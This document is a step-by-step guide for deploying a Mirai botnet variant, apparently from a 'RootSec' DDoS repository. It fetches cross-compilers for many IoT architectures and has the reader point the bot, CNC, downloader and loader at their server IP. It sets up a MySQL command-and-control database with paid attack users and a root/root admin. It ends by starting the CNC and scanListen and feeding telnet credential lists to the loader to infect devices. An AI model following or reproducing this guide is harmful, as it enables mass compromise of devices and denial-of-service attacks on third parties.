//STEP 1 
yum update -y
yum install epel-release -y
yum groupinstall "Development Tools" -y
yum install gmp-devel -y
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server gcc glibc-static go -y

//STEP 2 MYSQL INSTALL
wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm
sudo rpm -ivh mysql-community-release-el7-5.noarch.rpm
yum update -y
yum install mysql-server
systemctl start mysqld
systemctl enable mysqld

//STEP 3
mkdir /etc/xcompile
cd /etc/xcompile
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-i586.tar.bz2
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-i686.tar.bz2
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-m68k.tar.bz2
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-mips.tar.bz2
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-mipsel.tar.bz2
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-powerpc.tar.bz2
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-sh4.tar.bz2
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-sparc.tar.bz2
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv4l.tar.bz2
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv5l.tar.bz2
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv6l.tar.bz2
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv7l.tar.bz2
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-powerpc-440fp.tar.bz2
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-x86_64.tar.bz2
 wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-i486.tar.gz


 tar -jxf cross-compiler-i586.tar.bz2
 tar -jxf cross-compiler-m68k.tar.bz2
 tar -jxf cross-compiler-mips.tar.bz2
 tar -jxf cross-compiler-mipsel.tar.bz2
 tar -jxf cross-compiler-powerpc.tar.bz2
 tar -jxf cross-compiler-sh4.tar.bz2
 tar -jxf cross-compiler-i586.tar.bz2
 tar -jxf cross-compiler-i686.tar.bz2
 tar -jxf cross-compiler-sparc.tar.bz2
 tar -jxf cross-compiler-armv4l.tar.bz2
 tar -jxf cross-compiler-armv5l.tar.bz2
 tar -jxf cross-compiler-armv6l.tar.bz2
 tar -jxf cross-compiler-armv7l.tar.bz2
 tar -vxf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
 tar -jxf cross-compiler-powerpc-440fp.tar.bz2
 tar -jxf cross-compiler-x86_64.tar.bz2
 tar -xvf cross-compiler-i486.tar.gz

rm -rf *.tar.bz2
 mv cross-compiler-i486 i486
 mv cross-compiler-i586 i586
 mv cross-compiler-i686 i686
 mv cross-compiler-m68k m68k
 mv cross-compiler-mips mips
 mv cross-compiler-mipsel mipsel
 mv cross-compiler-powerpc powerpc
 mv cross-compiler-sh4 sh4
 mv cross-compiler-sparc sparc
 mv cross-compiler-armv4l armv4l
 mv cross-compiler-armv5l armv5l
 mv cross-compiler-armv6l armv6l
 mv cross-compiler-armv7l armv7l
 mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc
 mv cross-compiler-powerpc-440fp powerpc-440fp
 mv cross-compiler-x86_64 x86_64
cd ~/


//STEP 4 - SETTING UP SERVER IP
CHANGE bot/includes.h
CHANGE cnc/main.go
CHANGE dlr/main.c
CHANGE loader/src/main.c
CHANGE scanListen


//STEP 5 - DATABASE SETUP
service mysqld start
mysql_secure_installation
//SETUP A MYSQL PASS HERE AND REMEMBER IT
//NOW LOGIN TO MYSQL
mysql -p<PASS>
//COPY AND PASTE ALL THIS IN THE MYSQL TERMINAL
CREATE DATABASE storm;
use storm;
CREATE TABLE history (
  id int(10) unsigned NOT NULL AUTO_INCREMENT,
  user_id int(10) unsigned NOT NULL,
  time_sent int(10) unsigned NOT NULL,
  duration int(10) unsigned NOT NULL,
  command text NOT NULL,
  max_bots int(11) DEFAULT '-1',
  PRIMARY KEY (id),
  KEY user_id (user_id)
);
 
CREATE TABLE users (
  id int(10) unsigned NOT NULL AUTO_INCREMENT,
  username varchar(32) NOT NULL,
  password varchar(32) NOT NULL,
  duration_limit int(10) unsigned DEFAULT NULL,
  cooldown int(10) unsigned NOT NULL,
  wrc int(10) unsigned DEFAULT NULL,
  last_paid int(10) unsigned NOT NULL,
  max_bots int(11) DEFAULT '-1',
  admin int(10) unsigned DEFAULT '0',
  intvl int(10) unsigned DEFAULT '30',
  api_key text,
  PRIMARY KEY (id),
  KEY username (username)
);
 
CREATE TABLE whitelist (
  id int(10) unsigned NOT NULL AUTO_INCREMENT,
  prefix varchar(16) DEFAULT NULL,
  netmask tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (id),
  KEY prefix (prefix)
);
INSERT INTO users VALUES (NULL, 'root', 'root', 0, 0, 0, 0, -1, 1, 30, '');
exit;

//STEP 5 - COMPILE

NOW PUT THE MYSQL PASSWORD IN THE main.go OF THE CNC.

cd ~/
chmod 0777 * -R
sh build.sh YOUR IP
python payload.py //if your mirai variant has it, if doesnt find in some archive what has and edit to your bins

Now your mirai is setup you just need to start the cnc and the scanListen

screen ./cnc
screen ./scanListen

To load your telnet lists use command
cat list.txt | ./loader 

RootSec
https://github.com/R00tS3c/DDOS-RootSec/
